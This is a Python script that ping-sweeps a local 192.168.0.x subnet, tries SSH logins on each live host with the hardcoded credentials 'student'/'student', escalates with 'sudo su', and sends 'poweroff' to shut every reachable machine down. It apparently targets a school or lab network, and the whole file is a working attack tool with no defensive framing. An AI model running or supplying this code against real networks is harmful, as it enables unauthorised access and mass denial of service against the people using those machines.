#!/usr/bin/python3
import subprocess,os,threading,time
from queue import Queue
import paramiko
from rich.console import Console
import time

# Initalizing Important Varibles
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
yourIP = input("Your IP: ")
beginningOfIP = "192.168.0."
console = Console()
print("")
print("")
console.print("                                                                        10110", style="bold blue")
console.print("                                                                       001", style="bold blue")
console.print("                                                                    0111  00", style="bold blue")
console.print("                                                                     0      11", style="bold blue")
console.print("                                                                              10", style="bold blue")
console.print("                                                                               001", style="bold blue")
console.print("                                                                                 001", style="bold blue")
console.print("                                                                                   1111", style="bold blue")
console.print("                                                                                     011", style="bold blue")
console.print("", style="bold blue")
console.print("                                                    10110", style="bold blue")
console.print("                                                     0110", style="bold blue")
console.print("                                                      010", style="bold blue")
console.print("1111001001     011      111      0101        110101    11      10110          011      111         1111              1       1              1       1         1011001   110101", style="bold blue")
console.print("   1110        110      101     011011       010 101         10010            110      101        111101            101     101            101     101        10        010 101", style="bold blue")
console.print("   1011        010111010110   0001992101     101  101      10010              010111010110       100  110          11010   1010           11010   1010        11        101  101", style="bold blue")
console.print("   0101        101100101011   0001112101     110 111         1101             101100101011      1011010110        1011 10 01 102         1011 10 01 102       11110     110 111", style="bold blue")
console.print("   1010        110      101   0001112101     001010            1001           110      101     111      011      1011  11011  1101      1011  11011  1101     00        001010", style="bold blue")
console.print("   1101        001      110     001010       101 0001         1001            001      110    110        101    1101           1101    1101           1101    10        101 0001", style="bold blue")
console.print("   1101        001      110      0101        101  0001       1101             001      110   101          111  11101           11101  11101           11101   11111001  101  0001", style="bold blue")
# Swing Hammer ========================================================================
def hammer(ip):
        channel:Channel = ssh.invoke_shell()
        channel_data = str()
        while True:
                if channel.recv_ready():
                     console.print(beginningOfIP +  ip +  " Sucessfully Connected Through SSH", style="bold green")
                else:
                     continue
                channel.send("sudo su\n")
                time.sleep(0.1)
                channel.send("student\n")
                time.sleep(0.1)
                channel.send("poweroff\n")
                time.sleep(0.1)
                console.print(str(beginningOfIP + ip) + " Computer is off", style="bold red")
                channel_data += str(channel.recv(999))
                time.sleep(0.2)
                channel.send("^c\n")
                ssh.close()
                break
# Finding Mole ===============================================================================================
lock=threading.Lock()
_start=time.time()
def check(n):
        if str(n) != '54':
                if yourIP != str(n):
                        if str(n) != '197':
                                with open(os.devnull, "wb") as limbo:
                                        ip=str(beginningOfIP) + str(n)
                                        result=subprocess.Popen(["ping", "-c", "1", "-w", "1", ip],stdout=limbo, stderr=limbo).wait()
                                        with lock:
                                                if result == 0:
                                                        console.print (str(ip) +  " active", style="bold magenta")
                                                        try:
                                                                ssh.connect(ip, username='student', password='student')
                                                                console.print(ip +  " Was Sucessfull After Attempt To Connect", style="bold green")
                                                                hammer(str(n))
                                                        except:
                                                                console.print(ip + " Was Unsucessfull To Connect after Attempt To Connect With Username: student and Password: student", style="bold red")
                                                else:
                                                        pass

def threader():
    while True:
        worker=q.get()
        check(worker)
        q.task_done()
q=Queue()

for x in range(255):
    t=threading.Thread(target=threader)
    t.daemon=True
    t.start()
for worker in range(1,255):
    q.put(worker)
q.join()
console.print("Process completed in: " + str(time.time()-_start), style="bold blue")
